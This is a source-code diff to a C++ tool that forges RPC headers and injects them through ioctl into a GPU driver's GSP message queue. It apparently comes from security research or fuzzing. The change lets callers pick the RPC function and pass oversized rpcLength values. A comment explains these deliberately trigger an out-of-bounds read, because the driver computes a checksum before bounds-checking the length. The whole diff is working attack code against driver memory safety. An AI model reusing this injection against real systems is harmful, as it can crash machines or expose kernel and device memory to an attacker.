@@ -11,8 +11,6 @@ namespace
 {
 constexpr std::uint32_t FORGED_RPC_VERSION{0x03000000};
 constexpr std::uint32_t FORGED_RPC_SIGNATURE{0x43505256};
-constexpr std::uint32_t FORGED_RPC_LENGTH{0x20};
-constexpr std::uint32_t FORGED_RPC_FUNCTION{0x1001};
 
 constexpr std::uint64_t ELEM_RPCVERSION_OFF{48};
 constexpr std::uint64_t ELEM_RPCSIGNATURE_OFF{52};
@@ -50,7 +48,9 @@ std::uint32_t computeChecksum(const std::vector<std::uint8_t>& buf,
 // survives for the next attempt.
 //
 std::vector<std::uint8_t> makeHeaderElement(const std::uint32_t msgLength,
-					    const std::uint32_t rxSeqNum)
+					    const std::uint32_t rxSeqNum,
+					    const std::uint32_t rpcFunction,
+					    const std::uint32_t rpcLength)
 {
 	std::vector<std::uint8_t> element(GspMsgQueue::ELEM_SIZE_MIN, 0);
 
@@ -58,11 +58,23 @@ std::vector<std::uint8_t> makeHeaderElement(const std::uint32_t msgLength,
 	putU32(element, GspMsgQueue::ELEM_ELEMCOUNT_OFF, msgLength);
 	putU32(element, ELEM_RPCVERSION_OFF, FORGED_RPC_VERSION);
 	putU32(element, ELEM_RPCSIGNATURE_OFF, FORGED_RPC_SIGNATURE);
-	putU32(element, GspMsgQueue::ELEM_RPCLENGTH_OFF, FORGED_RPC_LENGTH);
-	putU32(element, ELEM_RPCFUNCTION_OFF, FORGED_RPC_FUNCTION);
+	putU32(element, GspMsgQueue::ELEM_RPCLENGTH_OFF, rpcLength);
+	putU32(element, ELEM_RPCFUNCTION_OFF, rpcFunction);
+
+	//
+	// The driver checksums GSP_MSG_QUEUE_ELEMENT_HDR_SIZE + rpc.length
+	// (message_queue_cpu.c:745) before it bounds-checks that sum
+	// (message_queue_cpu.c:825), so an oversized rpcLength is the point of
+	// several of these values. Clamp only our own span - reproducing the
+	// driver's read here would walk the same distance off the end of this
+	// 4096-byte vector. The stored checksum is then wrong for those values
+	// and the driver rejects the message, but only after the read.
+	//
+	const std::uint64_t span{
+	    std::min<std::uint64_t>(GspMsgQueue::ELEM_HDR_SIZE + rpcLength,
+				    element.size())};
 	putU32(element, GspMsgQueue::ELEM_CHECKSUM_OFF,
-	       computeChecksum(element,
-			       GspMsgQueue::ELEM_HDR_SIZE + FORGED_RPC_LENGTH));
+	       computeChecksum(element, span));
 
 	return element;
 }
@@ -101,7 +113,8 @@ int setElemcount(const std::uint64_t slotOffset, const std::uint32_t elemCount)
 	return 0;
 }
 
-int insertPayload(std::uint8_t* buffer, const std::uint32_t bufferSize)
+int insertPayload(std::uint8_t* buffer, const std::uint32_t bufferSize,
+		  const std::uint32_t rpcFunction, const std::uint32_t rpcLength)
 {
 	const GspMsgQueue::Layout* const layout{ensureGspReady()};
 	if (layout == nullptr) {
@@ -139,8 +152,8 @@ int insertPayload(std::uint8_t* buffer, const std::uint32_t bufferSize)
 	// One ioctl per contiguous run, not one per element: the write window is
 	// the time the ring is held open against a live readPtr.
 	//
-	std::vector<std::uint8_t> message{makeHeaderElement(msgLength,
-							   info->rxSeqNum)};
+	std::vector<std::uint8_t> message{makeHeaderElement(
+	    msgLength, info->rxSeqNum, rpcFunction, rpcLength)};
 	message.resize(static_cast<std::size_t>(msgLength) *
 		       GspMsgQueue::ELEM_SIZE_MIN);
 	std::memcpy(message.data() + GspMsgQueue::ELEM_SIZE_MIN, buffer,
